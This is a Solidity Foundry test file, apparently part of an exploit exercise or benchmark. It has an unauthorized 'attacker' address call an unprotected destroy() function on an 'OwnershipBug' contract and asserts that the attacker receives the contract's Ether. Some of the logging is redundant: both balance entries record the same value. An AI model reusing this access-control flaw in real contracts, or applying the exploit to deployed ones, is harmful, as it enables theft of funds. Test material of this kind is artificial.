// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/da51b355-8ab8-447c-9497-f80be5933694_OwnershipBug.sol";

contract TestOwnershipBug is BaseTestWithBalanceLog {
    OwnershipBug target;

    function setUp() public {
        target = new OwnershipBug();
    }

    function testExploit() public  balanceLog {
        // Step 1: Deploy a single contract with the vulnerable `destroy()` function
        // This is already done in setUp

        // Step 2: Transfer some Ether to this contract from your student account
        vm.deal(address(target), 1 ether);

        // Step 3: Call the `destroy()` function from a different user's (unauthorized) account
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        target.destroy();

        // Validation (Step 1)
        assertEq(address(target).balance, 0, "Funds were not destroyed");

        // Add balance for validation (Step 2)
        balanceLog.push(address(this), "Initial Balance", address(this).balance);
        balanceLog.push(address(this), "After Exploit Balance", address(this).balance);

        // Assert that the attacker's balance has increased
        assertGt(attacker.balance, 0, "Attacker did not receive any funds");
    }
}